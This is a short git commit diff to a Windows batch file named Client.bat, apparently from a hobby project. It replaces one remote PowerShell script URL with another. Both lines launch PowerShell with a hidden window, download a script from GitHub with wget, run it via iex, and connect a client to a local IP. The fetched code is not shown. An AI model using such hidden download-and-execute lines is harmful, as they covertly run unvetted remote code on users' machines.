d875ea0e5de720e52870b4bb08363002e5bfab2f
moritzpfefferkorn@hotmail.com <moritzpfefferkorn@hotmail.com>
2021-06-16 15:17:19 +0200

    Update Client.bat

--- Client.bat
+++ Client.bat
@@ -1,3 +1,3 @@
 @echo off
 
-powershell -windowstyle hidden -c "iex(wget "https://raw.github.com/mo-tec/Powershell-Remote/main/Client.ps1");Start-Client -ip 192.168.178.21"
+powershell -windowstyle hidden -c "iex(wget "https://raw.githubusercontent.com/PwshLab/Powershell-Chat/main/Chat.ps1");Start-Client -ip 192.168.178.21"
